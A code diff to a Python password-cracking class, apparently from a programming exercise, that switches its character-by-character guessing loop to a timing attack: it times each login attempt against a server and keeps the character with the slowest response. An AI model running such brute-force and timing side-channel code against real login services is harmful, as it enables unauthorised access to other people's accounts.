@@ -4,6 +4,8 @@ import os
 import socket
 import itertools
 import json
+import datetime
+import operator
 
 
 class PasswordChecker:
@@ -31,8 +33,6 @@ class PasswordChecker:
                 }))
                 self.client.get_response()
                 json_response = json.loads(self.client.server_response)
-                if json_response['result'] == 'Exception happened during login':
-                    return login
                 if json_response['result'] == 'Wrong password!':
                     return login
 
@@ -42,6 +42,7 @@ class PasswordChecker:
         max_pass_length = 30
         password = ['' for _i in range(max_pass_length)]
         for index in range(max_pass_length):
+            password_time_dict = {}
             for letter in itertools.chain(self.a_to_z, self.A_to_Z, self.zero_to_9):
                 password[index] = letter
                 credentials = {
@@ -49,14 +50,15 @@ class PasswordChecker:
                     'password': ''.join(password)
                 }
                 credentials = json.dumps(credentials)
+                time_before_sending_message = datetime.datetime.now()
                 self.client.send_message(credentials)
                 self.client.get_response()
+                time_after_receiving_message = datetime.datetime.now()
+                password_time_dict[letter] = time_after_receiving_message - time_before_sending_message
                 json_response = json.loads(self.client.server_response)
-                if json_response['result'] == 'Exception happened during login':
-                    break
                 if json_response['result'] == 'Connection success!':
                     return credentials
-
+            password[index] = max(password_time_dict.items(), key=operator.itemgetter(1))[0]
 
 
     def check_standard_passwords(self):
